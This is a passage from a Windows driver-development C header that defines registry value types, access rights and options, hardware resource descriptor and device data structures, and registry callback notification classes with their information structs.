#define REG_DWORD_LITTLE_ENDIAN            4
#define REG_DWORD_BIG_ENDIAN               5
#define REG_LINK                           6
#define REG_MULTI_SZ                       7
#define REG_RESOURCE_LIST                  8
#define REG_FULL_RESOURCE_DESCRIPTOR       9
#define REG_RESOURCE_REQUIREMENTS_LIST     10
#define REG_QWORD                          11
#define REG_QWORD_LITTLE_ENDIAN            11

/* Registry Access Rights */
#define KEY_QUERY_VALUE         (0x0001)
#define KEY_SET_VALUE           (0x0002)
#define KEY_CREATE_SUB_KEY      (0x0004)
#define KEY_ENUMERATE_SUB_KEYS  (0x0008)
#define KEY_NOTIFY              (0x0010)
#define KEY_CREATE_LINK         (0x0020)
#define KEY_WOW64_32KEY         (0x0200)
#define KEY_WOW64_64KEY         (0x0100)
#define KEY_WOW64_RES           (0x0300)

#define KEY_READ                ((STANDARD_RIGHTS_READ       |\
                                  KEY_QUERY_VALUE            |\
                                  KEY_ENUMERATE_SUB_KEYS     |\
                                  KEY_NOTIFY)                 \
                                  &                           \
                                 (~SYNCHRONIZE))

#define KEY_WRITE               ((STANDARD_RIGHTS_WRITE      |\
                                  KEY_SET_VALUE              |\
                                  KEY_CREATE_SUB_KEY)         \
                                  &                           \
                                 (~SYNCHRONIZE))

#define KEY_EXECUTE             ((KEY_READ)                   \
                                  &                           \
                                 (~SYNCHRONIZE))

#define KEY_ALL_ACCESS          ((STANDARD_RIGHTS_ALL        |\
                                  KEY_QUERY_VALUE            |\
                                  KEY_SET_VALUE              |\
                                  KEY_CREATE_SUB_KEY         |\
                                  KEY_ENUMERATE_SUB_KEYS     |\
                                  KEY_NOTIFY                 |\
                                  KEY_CREATE_LINK)            \
                                  &                           \
                                 (~SYNCHRONIZE))

/* Registry Open/Create Options */
#define REG_OPTION_RESERVED         (0x00000000L)
#define REG_OPTION_NON_VOLATILE     (0x00000000L)
#define REG_OPTION_VOLATILE         (0x00000001L)
#define REG_OPTION_CREATE_LINK      (0x00000002L)
#define REG_OPTION_BACKUP_RESTORE   (0x00000004L)
#define REG_OPTION_OPEN_LINK        (0x00000008L)

#define REG_LEGAL_OPTION            \
                (REG_OPTION_RESERVED            |\
                 REG_OPTION_NON_VOLATILE        |\
                 REG_OPTION_VOLATILE            |\
                 REG_OPTION_CREATE_LINK         |\
                 REG_OPTION_BACKUP_RESTORE      |\
                 REG_OPTION_OPEN_LINK)

#define REG_OPEN_LEGAL_OPTION       \
                (REG_OPTION_RESERVED            |\
                 REG_OPTION_BACKUP_RESTORE      |\
                 REG_OPTION_OPEN_LINK)

#define REG_STANDARD_FORMAT            1
#define REG_LATEST_FORMAT              2
#define REG_NO_COMPRESSION             4

/* Key creation/open disposition */
#define REG_CREATED_NEW_KEY         (0x00000001L)
#define REG_OPENED_EXISTING_KEY     (0x00000002L)

/* Key restore & hive load flags */
#define REG_WHOLE_HIVE_VOLATILE         (0x00000001L)
#define REG_REFRESH_HIVE                (0x00000002L)
#define REG_NO_LAZY_FLUSH               (0x00000004L)
#define REG_FORCE_RESTORE               (0x00000008L)
#define REG_APP_HIVE                    (0x00000010L)
#define REG_PROCESS_PRIVATE             (0x00000020L)
#define REG_START_JOURNAL               (0x00000040L)
#define REG_HIVE_EXACT_FILE_GROWTH      (0x00000080L)
#define REG_HIVE_NO_RM                  (0x00000100L)
#define REG_HIVE_SINGLE_LOG             (0x00000200L)
#define REG_BOOT_HIVE                   (0x00000400L)

/* Unload Flags */
#define REG_FORCE_UNLOAD            1

/* Notify Filter Values */
#define REG_NOTIFY_CHANGE_NAME          (0x00000001L)
#define REG_NOTIFY_CHANGE_ATTRIBUTES    (0x00000002L)
#define REG_NOTIFY_CHANGE_LAST_SET      (0x00000004L)
#define REG_NOTIFY_CHANGE_SECURITY      (0x00000008L)

#define REG_LEGAL_CHANGE_FILTER                 \
                (REG_NOTIFY_CHANGE_NAME          |\
                 REG_NOTIFY_CHANGE_ATTRIBUTES    |\
                 REG_NOTIFY_CHANGE_LAST_SET      |\
                 REG_NOTIFY_CHANGE_SECURITY)

#include <pshpack4.h>
typedef struct _CM_PARTIAL_RESOURCE_DESCRIPTOR {
  UCHAR Type;
  UCHAR ShareDisposition;
  USHORT Flags;
  union {
    struct {
      PHYSICAL_ADDRESS Start;
      ULONG Length;
    } Generic;
    struct {
      PHYSICAL_ADDRESS Start;
      ULONG Length;
    } Port;
    struct {
#if defined(NT_PROCESSOR_GROUPS)
      USHORT Level;
      USHORT Group;
#else
      ULONG Level;
#endif
      ULONG Vector;
      KAFFINITY Affinity;
    } Interrupt;
#if (NTDDI_VERSION >= NTDDI_LONGHORN)
    struct {
      _ANONYMOUS_UNION union {
        struct {
#if defined(NT_PROCESSOR_GROUPS)
          USHORT Group;
#else
          USHORT Reserved;
#endif
          USHORT MessageCount;
          ULONG Vector;
          KAFFINITY Affinity;
        } Raw;
        struct {
#if defined(NT_PROCESSOR_GROUPS)
          USHORT Level;
          USHORT Group;
#else
          ULONG Level;
#endif
          ULONG Vector;
          KAFFINITY Affinity;
        } Translated;
      } DUMMYUNIONNAME;
    } MessageInterrupt;
#endif
    struct {
      PHYSICAL_ADDRESS Start;
      ULONG Length;
    } Memory;
    struct {
      ULONG Channel;
      ULONG Port;
      ULONG Reserved1;
    } Dma;
    struct {
      ULONG Data[3];
    } DevicePrivate;
    struct {
      ULONG Start;
      ULONG Length;
      ULONG Reserved;
    } BusNumber;
    struct {
      ULONG DataSize;
      ULONG Reserved1;
      ULONG Reserved2;
    } DeviceSpecificData;
#if (NTDDI_VERSION >= NTDDI_LONGHORN)
    struct {
      PHYSICAL_ADDRESS Start;
      ULONG Length40;
    } Memory40;
    struct {
      PHYSICAL_ADDRESS Start;
      ULONG Length48;
    } Memory48;
    struct {
      PHYSICAL_ADDRESS Start;
      ULONG Length64;
    } Memory64;
#endif
  } u;
} CM_PARTIAL_RESOURCE_DESCRIPTOR, *PCM_PARTIAL_RESOURCE_DESCRIPTOR;
#include <poppack.h>

/* CM_PARTIAL_RESOURCE_DESCRIPTOR.Type */
#define CmResourceTypeNull                0
#define CmResourceTypePort                1
#define CmResourceTypeInterrupt           2
#define CmResourceTypeMemory              3
#define CmResourceTypeDma                 4
#define CmResourceTypeDeviceSpecific      5
#define CmResourceTypeBusNumber           6
#define CmResourceTypeMemoryLarge         7
#define CmResourceTypeNonArbitrated       128
#define CmResourceTypeConfigData          128
#define CmResourceTypeDevicePrivate       129
#define CmResourceTypePcCardConfig        130
#define CmResourceTypeMfCardConfig        131

/* CM_PARTIAL_RESOURCE_DESCRIPTOR.ShareDisposition */
typedef enum _CM_SHARE_DISPOSITION {
  CmResourceShareUndetermined = 0,
  CmResourceShareDeviceExclusive,
  CmResourceShareDriverExclusive,
  CmResourceShareShared
} CM_SHARE_DISPOSITION;

/* CM_PARTIAL_RESOURCE_DESCRIPTOR.Flags if Type = CmResourceTypePort */
#define CM_RESOURCE_PORT_MEMORY           0x0000
#define CM_RESOURCE_PORT_IO               0x0001
#define CM_RESOURCE_PORT_10_BIT_DECODE    0x0004
#define CM_RESOURCE_PORT_12_BIT_DECODE    0x0008
#define CM_RESOURCE_PORT_16_BIT_DECODE    0x0010
#define CM_RESOURCE_PORT_POSITIVE_DECODE  0x0020
#define CM_RESOURCE_PORT_PASSIVE_DECODE   0x0040
#define CM_RESOURCE_PORT_WINDOW_DECODE    0x0080
#define CM_RESOURCE_PORT_BAR              0x0100

/* CM_PARTIAL_RESOURCE_DESCRIPTOR.Flags if Type = CmResourceTypeInterrupt */
#define CM_RESOURCE_INTERRUPT_LEVEL_SENSITIVE 0x0000
#define CM_RESOURCE_INTERRUPT_LATCHED         0x0001
#define CM_RESOURCE_INTERRUPT_MESSAGE         0x0002
#define CM_RESOURCE_INTERRUPT_POLICY_INCLUDED 0x0004

#define CM_RESOURCE_INTERRUPT_LEVEL_LATCHED_BITS 0x0001

#define CM_RESOURCE_INTERRUPT_MESSAGE_TOKEN   ((ULONG)-2)

/* CM_PARTIAL_RESOURCE_DESCRIPTOR.Flags if Type = CmResourceTypeMemory */
#define CM_RESOURCE_MEMORY_READ_WRITE                    0x0000
#define CM_RESOURCE_MEMORY_READ_ONLY                     0x0001
#define CM_RESOURCE_MEMORY_WRITE_ONLY                    0x0002
#define CM_RESOURCE_MEMORY_WRITEABILITY_MASK             0x0003
#define CM_RESOURCE_MEMORY_PREFETCHABLE                  0x0004
#define CM_RESOURCE_MEMORY_COMBINEDWRITE                 0x0008
#define CM_RESOURCE_MEMORY_24                            0x0010
#define CM_RESOURCE_MEMORY_CACHEABLE                     0x0020
#define CM_RESOURCE_MEMORY_WINDOW_DECODE                 0x0040
#define CM_RESOURCE_MEMORY_BAR                           0x0080
#define CM_RESOURCE_MEMORY_COMPAT_FOR_INACCESSIBLE_RANGE 0x0100

#define CM_RESOURCE_MEMORY_LARGE                         0x0E00
#define CM_RESOURCE_MEMORY_LARGE_40                      0x0200
#define CM_RESOURCE_MEMORY_LARGE_48                      0x0400
#define CM_RESOURCE_MEMORY_LARGE_64                      0x0800

#define CM_RESOURCE_MEMORY_LARGE_40_MAXLEN               0x000000FFFFFFFF00
#define CM_RESOURCE_MEMORY_LARGE_48_MAXLEN               0x0000FFFFFFFF0000
#define CM_RESOURCE_MEMORY_LARGE_64_MAXLEN               0xFFFFFFFF00000000

/* CM_PARTIAL_RESOURCE_DESCRIPTOR.Flags if Type = CmResourceTypeDma */
#define CM_RESOURCE_DMA_8                 0x0000
#define CM_RESOURCE_DMA_16                0x0001
#define CM_RESOURCE_DMA_32                0x0002
#define CM_RESOURCE_DMA_8_AND_16          0x0004
#define CM_RESOURCE_DMA_BUS_MASTER        0x0008
#define CM_RESOURCE_DMA_TYPE_A            0x0010
#define CM_RESOURCE_DMA_TYPE_B            0x0020
#define CM_RESOURCE_DMA_TYPE_F            0x0040

typedef struct _DEVICE_FLAGS {
  ULONG Failed:1;
  ULONG ReadOnly:1;
  ULONG Removable:1;
  ULONG ConsoleIn:1;
  ULONG ConsoleOut:1;
  ULONG Input:1;
  ULONG Output:1;
} DEVICE_FLAGS, *PDEVICE_FLAGS;

typedef enum _INTERFACE_TYPE {
  InterfaceTypeUndefined = -1,
  Internal,
  Isa,
  Eisa,
  MicroChannel,
  TurboChannel,
  PCIBus,
  VMEBus,
  NuBus,
  PCMCIABus,
  CBus,
  MPIBus,
  MPSABus,
  ProcessorInternal,
  InternalPowerBus,
  PNPISABus,
  PNPBus,
  Vmcs,
  ACPIBus,
  MaximumInterfaceType
} INTERFACE_TYPE, *PINTERFACE_TYPE;

typedef struct _CM_COMPONENT_INFORMATION {
  DEVICE_FLAGS Flags;
  ULONG Version;
  ULONG Key;
  KAFFINITY AffinityMask;
} CM_COMPONENT_INFORMATION, *PCM_COMPONENT_INFORMATION;

typedef struct _CM_ROM_BLOCK {
  ULONG Address;
  ULONG Size;
} CM_ROM_BLOCK, *PCM_ROM_BLOCK;

typedef struct _CM_PARTIAL_RESOURCE_LIST {
  USHORT Version;
  USHORT Revision;
  ULONG Count;
  CM_PARTIAL_RESOURCE_DESCRIPTOR PartialDescriptors[1];
} CM_PARTIAL_RESOURCE_LIST, *PCM_PARTIAL_RESOURCE_LIST;

typedef struct _CM_FULL_RESOURCE_DESCRIPTOR {
  INTERFACE_TYPE InterfaceType;
  ULONG BusNumber;
  CM_PARTIAL_RESOURCE_LIST PartialResourceList;
} CM_FULL_RESOURCE_DESCRIPTOR, *PCM_FULL_RESOURCE_DESCRIPTOR;

typedef struct _CM_RESOURCE_LIST {
  ULONG Count;
  CM_FULL_RESOURCE_DESCRIPTOR List[1];
} CM_RESOURCE_LIST, *PCM_RESOURCE_LIST;

typedef struct _PNP_BUS_INFORMATION {
  GUID BusTypeGuid;
  INTERFACE_TYPE LegacyBusType;
  ULONG BusNumber;
} PNP_BUS_INFORMATION, *PPNP_BUS_INFORMATION;

#include <pshpack1.h>

typedef struct _CM_INT13_DRIVE_PARAMETER {
  USHORT DriveSelect;
  ULONG MaxCylinders;
  USHORT SectorsPerTrack;
  USHORT MaxHeads;
  USHORT NumberDrives;
} CM_INT13_DRIVE_PARAMETER, *PCM_INT13_DRIVE_PARAMETER;

typedef struct _CM_MCA_POS_DATA {
  USHORT AdapterId;
  UCHAR PosData1;
  UCHAR PosData2;
  UCHAR PosData3;
  UCHAR PosData4;
} CM_MCA_POS_DATA, *PCM_MCA_POS_DATA;

typedef struct _CM_PNP_BIOS_DEVICE_NODE {
  USHORT Size;
  UCHAR Node;
  ULONG ProductId;
  UCHAR DeviceType[3];
  USHORT DeviceAttributes;
} CM_PNP_BIOS_DEVICE_NODE,*PCM_PNP_BIOS_DEVICE_NODE;

typedef struct _CM_PNP_BIOS_INSTALLATION_CHECK {
  UCHAR Signature[4];
  UCHAR Revision;
  UCHAR Length;
  USHORT ControlField;
  UCHAR Checksum;
  ULONG EventFlagAddress;
  USHORT RealModeEntryOffset;
  USHORT RealModeEntrySegment;
  USHORT ProtectedModeEntryOffset;
  ULONG ProtectedModeCodeBaseAddress;
  ULONG OemDeviceId;
  USHORT RealModeDataBaseAddress;
  ULONG ProtectedModeDataBaseAddress;
} CM_PNP_BIOS_INSTALLATION_CHECK, *PCM_PNP_BIOS_INSTALLATION_CHECK;

#include <poppack.h>

typedef struct _CM_DISK_GEOMETRY_DEVICE_DATA {
  ULONG BytesPerSector;
  ULONG NumberOfCylinders;
  ULONG SectorsPerTrack;
  ULONG NumberOfHeads;
} CM_DISK_GEOMETRY_DEVICE_DATA, *PCM_DISK_GEOMETRY_DEVICE_DATA;

typedef struct _CM_KEYBOARD_DEVICE_DATA {
  USHORT Version;
  USHORT Revision;
  UCHAR Type;
  UCHAR Subtype;
  USHORT KeyboardFlags;
} CM_KEYBOARD_DEVICE_DATA, *PCM_KEYBOARD_DEVICE_DATA;

typedef struct _CM_SCSI_DEVICE_DATA {
  USHORT Version;
  USHORT Revision;
  UCHAR HostIdentifier;
} CM_SCSI_DEVICE_DATA, *PCM_SCSI_DEVICE_DATA;

typedef struct _CM_VIDEO_DEVICE_DATA {
  USHORT Version;
  USHORT Revision;
  ULONG VideoClock;
} CM_VIDEO_DEVICE_DATA, *PCM_VIDEO_DEVICE_DATA;

typedef struct _CM_SONIC_DEVICE_DATA {
  USHORT Version;
  USHORT Revision;
  USHORT DataConfigurationRegister;
  UCHAR EthernetAddress[8];
} CM_SONIC_DEVICE_DATA, *PCM_SONIC_DEVICE_DATA;

typedef struct _CM_SERIAL_DEVICE_DATA {
  USHORT Version;
  USHORT Revision;
  ULONG BaudClock;
} CM_SERIAL_DEVICE_DATA, *PCM_SERIAL_DEVICE_DATA;

typedef struct _CM_MONITOR_DEVICE_DATA {
  USHORT Version;
  USHORT Revision;
  USHORT HorizontalScreenSize;
  USHORT VerticalScreenSize;
  USHORT HorizontalResolution;
  USHORT VerticalResolution;
  USHORT HorizontalDisplayTimeLow;
  USHORT HorizontalDisplayTime;
  USHORT HorizontalDisplayTimeHigh;
  USHORT HorizontalBackPorchLow;
  USHORT HorizontalBackPorch;
  USHORT HorizontalBackPorchHigh;
  USHORT HorizontalFrontPorchLow;
  USHORT HorizontalFrontPorch;
  USHORT HorizontalFrontPorchHigh;
  USHORT HorizontalSyncLow;
  USHORT HorizontalSync;
  USHORT HorizontalSyncHigh;
  USHORT VerticalBackPorchLow;
  USHORT VerticalBackPorch;
  USHORT VerticalBackPorchHigh;
  USHORT VerticalFrontPorchLow;
  USHORT VerticalFrontPorch;
  USHORT VerticalFrontPorchHigh;
  USHORT VerticalSyncLow;
  USHORT VerticalSync;
  USHORT VerticalSyncHigh;
} CM_MONITOR_DEVICE_DATA, *PCM_MONITOR_DEVICE_DATA;

typedef struct _CM_FLOPPY_DEVICE_DATA {
  USHORT Version;
  USHORT Revision;
  CHAR Size[8];
  ULONG MaxDensity;
  ULONG MountDensity;
  UCHAR StepRateHeadUnloadTime;
  UCHAR HeadLoadTime;
  UCHAR MotorOffTime;
  UCHAR SectorLengthCode;
  UCHAR SectorPerTrack;
  UCHAR ReadWriteGapLength;
  UCHAR DataTransferLength;
  UCHAR FormatGapLength;
  UCHAR FormatFillCharacter;
  UCHAR HeadSettleTime;
  UCHAR MotorSettleTime;
  UCHAR MaximumTrackValue;
  UCHAR DataTransferRate;
} CM_FLOPPY_DEVICE_DATA, *PCM_FLOPPY_DEVICE_DATA;

typedef enum _KEY_INFORMATION_CLASS {
  KeyBasicInformation,
  KeyNodeInformation,
  KeyFullInformation,
  KeyNameInformation,
  KeyCachedInformation,
  KeyFlagsInformation,
  KeyVirtualizationInformation,
  KeyHandleTagsInformation,
  KeyTrustInformation,
  KeyLayerInformation,
  MaxKeyInfoClass
} KEY_INFORMATION_CLASS;

typedef struct _KEY_BASIC_INFORMATION {
  LARGE_INTEGER LastWriteTime;
  ULONG TitleIndex;
  ULONG NameLength;
  WCHAR Name[1];
} KEY_BASIC_INFORMATION, *PKEY_BASIC_INFORMATION;

typedef struct _KEY_CONTROL_FLAGS_INFORMATION {
  ULONG ControlFlags;
} KEY_CONTROL_FLAGS_INFORMATION, *PKEY_CONTROL_FLAGS_INFORMATION;

typedef struct _KEY_FULL_INFORMATION {
  LARGE_INTEGER LastWriteTime;
  ULONG TitleIndex;
  ULONG ClassOffset;
  ULONG ClassLength;
  ULONG SubKeys;
  ULONG MaxNameLen;
  ULONG MaxClassLen;
  ULONG Values;
  ULONG MaxValueNameLen;
  ULONG MaxValueDataLen;
  WCHAR Class[1];
} KEY_FULL_INFORMATION, *PKEY_FULL_INFORMATION;

typedef struct _KEY_HANDLE_TAGS_INFORMATION {
  ULONG HandleTags;
} KEY_HANDLE_TAGS_INFORMATION, *PKEY_HANDLE_TAGS_INFORMATION;

typedef struct _KEY_NODE_INFORMATION {
  LARGE_INTEGER LastWriteTime;
  ULONG TitleIndex;
  ULONG ClassOffset;
  ULONG ClassLength;
  ULONG NameLength;
  WCHAR Name[1];
} KEY_NODE_INFORMATION, *PKEY_NODE_INFORMATION;

typedef enum _KEY_SET_INFORMATION_CLASS {
  KeyWriteTimeInformation,
  KeyWow64FlagsInformation,
  KeyControlFlagsInformation,
  KeySetVirtualizationInformation,
  KeySetDebugInformation,
  KeySetHandleTagsInformation,
  KeySetLayerInformation,
  MaxKeySetInfoClass
} KEY_SET_INFORMATION_CLASS;

typedef struct _KEY_SET_VIRTUALIZATION_INFORMATION {
  ULONG VirtualTarget:1;
  ULONG VirtualStore:1;
  ULONG VirtualSource:1;
  ULONG Reserved:29;
} KEY_SET_VIRTUALIZATION_INFORMATION, *PKEY_SET_VIRTUALIZATION_INFORMATION;

typedef struct _KEY_VALUE_BASIC_INFORMATION {
  ULONG TitleIndex;
  ULONG Type;
  ULONG NameLength;
  WCHAR Name[1];
} KEY_VALUE_BASIC_INFORMATION, *PKEY_VALUE_BASIC_INFORMATION;

typedef struct _KEY_VALUE_FULL_INFORMATION {
  ULONG TitleIndex;
  ULONG Type;
  ULONG DataOffset;
  ULONG DataLength;
  ULONG NameLength;
  WCHAR Name[1];
} KEY_VALUE_FULL_INFORMATION, *PKEY_VALUE_FULL_INFORMATION;

typedef struct _KEY_VALUE_PARTIAL_INFORMATION {
  ULONG TitleIndex;
  ULONG Type;
  ULONG DataLength;
  UCHAR Data[1];
} KEY_VALUE_PARTIAL_INFORMATION, *PKEY_VALUE_PARTIAL_INFORMATION;

typedef struct _KEY_VALUE_PARTIAL_INFORMATION_ALIGN64 {
  ULONG Type;
  ULONG DataLength;
  UCHAR Data[1];
} KEY_VALUE_PARTIAL_INFORMATION_ALIGN64, *PKEY_VALUE_PARTIAL_INFORMATION_ALIGN64;

typedef struct _KEY_VALUE_ENTRY {
  PUNICODE_STRING ValueName;
  ULONG DataLength;
  ULONG DataOffset;
  ULONG Type;
} KEY_VALUE_ENTRY, *PKEY_VALUE_ENTRY;

typedef enum _KEY_VALUE_INFORMATION_CLASS {
  KeyValueBasicInformation,
  KeyValueFullInformation,
  KeyValuePartialInformation,
  KeyValueFullInformationAlign64,
  KeyValuePartialInformationAlign64,
  KeyValueLayerInformation,
  MaxKeyValueInfoClass
} KEY_VALUE_INFORMATION_CLASS;

typedef struct _KEY_WOW64_FLAGS_INFORMATION {
  ULONG UserFlags;
} KEY_WOW64_FLAGS_INFORMATION, *PKEY_WOW64_FLAGS_INFORMATION;

typedef struct _KEY_WRITE_TIME_INFORMATION {
  LARGE_INTEGER LastWriteTime;
} KEY_WRITE_TIME_INFORMATION, *PKEY_WRITE_TIME_INFORMATION;

typedef enum _REG_NOTIFY_CLASS {
  RegNtDeleteKey,
  RegNtPreDeleteKey = RegNtDeleteKey,
  RegNtSetValueKey,
  RegNtPreSetValueKey = RegNtSetValueKey,
  RegNtDeleteValueKey,
  RegNtPreDeleteValueKey = RegNtDeleteValueKey,
  RegNtSetInformationKey,
  RegNtPreSetInformationKey = RegNtSetInformationKey,
  RegNtRenameKey,
  RegNtPreRenameKey = RegNtRenameKey,
  RegNtEnumerateKey,
  RegNtPreEnumerateKey = RegNtEnumerateKey,
  RegNtEnumerateValueKey,
  RegNtPreEnumerateValueKey = RegNtEnumerateValueKey,
  RegNtQueryKey,
  RegNtPreQueryKey = RegNtQueryKey,
  RegNtQueryValueKey,
  RegNtPreQueryValueKey = RegNtQueryValueKey,
  RegNtQueryMultipleValueKey,
  RegNtPreQueryMultipleValueKey = RegNtQueryMultipleValueKey,
  RegNtPreCreateKey,
  RegNtPostCreateKey,
  RegNtPreOpenKey,
  RegNtPostOpenKey,
  RegNtKeyHandleClose,
  RegNtPreKeyHandleClose = RegNtKeyHandleClose,
  RegNtPostDeleteKey,
  RegNtPostSetValueKey,
  RegNtPostDeleteValueKey,
  RegNtPostSetInformationKey,
  RegNtPostRenameKey,
  RegNtPostEnumerateKey,
  RegNtPostEnumerateValueKey,
  RegNtPostQueryKey,
  RegNtPostQueryValueKey,
  RegNtPostQueryMultipleValueKey,
  RegNtPostKeyHandleClose,
  RegNtPreCreateKeyEx,
  RegNtPostCreateKeyEx,
  RegNtPreOpenKeyEx,
  RegNtPostOpenKeyEx,
  RegNtPreFlushKey,
  RegNtPostFlushKey,
  RegNtPreLoadKey,
  RegNtPostLoadKey,
  RegNtPreUnLoadKey,
  RegNtPostUnLoadKey,
  RegNtPreQueryKeySecurity,
  RegNtPostQueryKeySecurity,
  RegNtPreSetKeySecurity,
  RegNtPostSetKeySecurity,
  RegNtCallbackObjectContextCleanup,
  RegNtPreRestoreKey,
  RegNtPostRestoreKey,
  RegNtPreSaveKey,
  RegNtPostSaveKey,
  RegNtPreReplaceKey,
  RegNtPostReplaceKey,
  RegNtPreQueryKeyName,
  RegNtPostQueryKeyName,
  MaxRegNtNotifyClass
} REG_NOTIFY_CLASS, *PREG_NOTIFY_CLASS;

typedef NTSTATUS
(NTAPI EX_CALLBACK_FUNCTION)(
  IN PVOID CallbackContext,
  IN PVOID Argument1,
  IN PVOID Argument2);
typedef EX_CALLBACK_FUNCTION *PEX_CALLBACK_FUNCTION;

typedef struct _REG_DELETE_KEY_INFORMATION {
  PVOID Object;
  PVOID CallContext;
  PVOID ObjectContext;
  PVOID Reserved;
} REG_DELETE_KEY_INFORMATION, *PREG_DELETE_KEY_INFORMATION
#if (NTDDI_VERSION >= NTDDI_VISTA)
, REG_FLUSH_KEY_INFORMATION, *PREG_FLUSH_KEY_INFORMATION
#endif
;

typedef struct _REG_SET_VALUE_KEY_INFORMATION {
  PVOID Object;
  PUNICODE_STRING ValueName;
  ULONG TitleIndex;
  ULONG Type;
  PVOID Data;
  ULONG DataSize;
  PVOID CallContext;
  PVOID ObjectContext;
  PVOID Reserved;
} REG_SET_VALUE_KEY_INFORMATION, *PREG_SET_VALUE_KEY_INFORMATION;

typedef struct _REG_DELETE_VALUE_KEY_INFORMATION {
  PVOID Object;
  PUNICODE_STRING ValueName;
  PVOID CallContext;
  PVOID ObjectContext;
  PVOID Reserved;
} REG_DELETE_VALUE_KEY_INFORMATION, *PREG_DELETE_VALUE_KEY_INFORMATION;

typedef struct _REG_SET_INFORMATION_KEY_INFORMATION {
  PVOID Object;
  KEY_SET_INFORMATION_CLASS KeySetInformationClass;
  PVOID KeySetInformation;
  ULONG KeySetInformationLength;
  PVOID CallContext;
  PVOID ObjectContext;
  PVOID Reserved;
} REG_SET_INFORMATION_KEY_INFORMATION, *PREG_SET_INFORMATION_KEY_INFORMATION;

typedef struct _REG_ENUMERATE_KEY_INFORMATION {
  PVOID Object;
  ULONG Index;
  KEY_INFORMATION_CLASS KeyInformationClass;
  PVOID KeyInformation;
  ULONG Length;
  PULONG ResultLength;
  PVOID CallContext;
  PVOID ObjectContext;
  PVOID Reserved;
} REG_ENUMERATE_KEY_INFORMATION, *PREG_ENUMERATE_KEY_INFORMATION;

typedef struct _REG_ENUMERATE_VALUE_KEY_INFORMATION {
  PVOID Object;
  ULONG Index;
  KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass;
  PVOID KeyValueInformation;
  ULONG Length;
  PULONG ResultLength;
  PVOID CallContext;
  PVOID ObjectContext;
  PVOID Reserved;
} REG_ENUMERATE_VALUE_KEY_INFORMATION, *PREG_ENUMERATE_VALUE_KEY_INFORMATION;

typedef struct _REG_QUERY_KEY_INFORMATION {
  PVOID Object;
  KEY_INFORMATION_CLASS KeyInformationClass;
  PVOID KeyInformation;
  ULONG Length;
  PULONG ResultLength;
  PVOID CallContext;
  PVOID ObjectContext;
  PVOID Reserved;
} REG_QUERY_KEY_INFORMATION, *PREG_QUERY_KEY_INFORMATION;

typedef struct _REG_QUERY_VALUE_KEY_INFORMATION {
  PVOID Object;
  PUNICODE_STRING ValueName;
  KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass;
  PVOID KeyValueInformation;
  ULONG Length;
  PULONG ResultLength;
  PVOID CallContext;
  PVOID ObjectContext;
  PVOID Reserved;
} REG_QUERY_VALUE_KEY_INFORMATION, *PREG_QUERY_VALUE_KEY_INFORMATION;

typedef struct _REG_QUERY_MULTIPLE_VALUE_KEY_INFORMATION {
  PVOID Object;
  PKEY_VALUE_ENTRY ValueEntries;
  ULONG EntryCount;
  PVOID ValueBuffer;
  PULONG BufferLength;
  PULONG RequiredBufferLength;
  PVOID CallContext;
  PVOID ObjectContext;
  PVOID Reserved;
} REG_QUERY_MULTIPLE_VALUE_KEY_INFORMATION, *PREG_QUERY_MULTIPLE_VALUE_KEY_INFORMATION;

typedef struct _REG_RENAME_KEY_INFORMATION {
  PVOID Object;
  PUNICODE_STRING NewName;
  PVOID CallContext;
  PVOID ObjectContext;
  PVOID Reserved;
} REG_RENAME_KEY_INFORMATION, *PREG_RENAME_KEY_INFORMATION;

typedef struct _REG_CREATE_KEY_INFORMATION {
  PUNICODE_STRING CompleteName;
  PVOID RootObject;
  PVOID ObjectType;
  ULONG CreateOptions;
  PUNICODE_STRING Class;
  PVOID SecurityDescriptor;
  PVOID SecurityQualityOfService;
  ACCESS_MASK DesiredAccess;
  ACCESS_MASK GrantedAccess;
  PULONG Disposition;
  PVOID *ResultObject;
  PVOID CallContext;
  PVOID RootObjectContext;
  PVOID Transaction;
  PVOID Reserved;
} REG_CREATE_KEY_INFORMATION, REG_OPEN_KEY_INFORMATION,*PREG_CREATE_KEY_INFORMATION, *PREG_OPEN_KEY_INFORMATION;

typedef struct _REG_CREATE_KEY_INFORMATION_V1 {
  PUNICODE_STRING CompleteName;
  PVOID RootObject;
  PVOID ObjectType;
  ULONG Options;
  PUNICODE_STRING Class;
  PVOID SecurityDescriptor;
  PVOID SecurityQualityOfService;
  ACCESS_MASK DesiredAccess;
  ACCESS_MASK GrantedAccess;
  PULONG Disposition;
  PVOID *ResultObject;
  PVOID CallContext;
  PVOID RootObjectContext;
  PVOID Transaction;
  ULONG_PTR Version;
  PUNICODE_STRING RemainingName;
  ULONG Wow64Flags;
  ULONG Attributes;
  KPROCESSOR_MODE CheckAccessMode;
} REG_CREATE_KEY_INFORMATION_V1, REG_OPEN_KEY_INFORMATION_V1,*PREG_CREATE_KEY_INFORMATION_V1, *PREG_OPEN_KEY_INFORMATION_V1;

typedef struct _REG_PRE_CREATE_KEY_INFORMATION {
  PUNICODE_STRING CompleteName;
} REG_PRE_CREATE_KEY_INFORMATION, REG_PRE_OPEN_KEY_INFORMATION,*PREG_PRE_CREATE_KEY_INFORMATION, *PREG_PRE_OPEN_KEY_INFORMATION;

typedef struct _REG_POST_CREATE_KEY_INFORMATION {
  PUNICODE_STRING CompleteName;
  PVOID Object;
  NTSTATUS Status;
} REG_POST_CREATE_KEY_INFORMATION,REG_POST_OPEN_KEY_INFORMATION, *PREG_POST_CREATE_KEY_INFORMATION, *PREG_POST_OPEN_KEY_INFORMATION;

typedef struct _REG_POST_OPERATION_INFORMATION {
  PVOID Object;
  NTSTATUS Status;
  PVOID PreInformation;
  NTSTATUS ReturnStatus;
  PVOID CallContext;
  PVOID ObjectContext;
  PVOID Reserved;
} REG_POST_OPERATION_INFORMATION,*PREG_POST_OPERATION_INFORMATION;

typedef struct _REG_KEY_HANDLE_CLOSE_INFORMATION {
  PVOID Object;
  PVOID CallContext;
  PVOID ObjectContext;
  PVOID Reserved;
} REG_KEY_HANDLE_CLOSE_INFORMATION, *PREG_KEY_HANDLE_CLOSE_INFORMATION;

#if (NTDDI_VERSION >= NTDDI_VISTA)

typedef struct _REG_LOAD_KEY_INFORMATION {
  PVOID Object;
  PUNICODE_STRING KeyName;
  PUNICODE_STRING SourceFile;
  ULONG Flags;
  PVOID TrustClassObject;
  PVOID UserEvent;
  ACCESS_MASK DesiredAccess;
  PHANDLE RootHandle;
  PVOID CallContext;
  PVOID ObjectContext;
  PVOID Reserved;
} REG_LOAD_KEY_INFORMATION, *PREG_LOAD_KEY_INFORMATION;

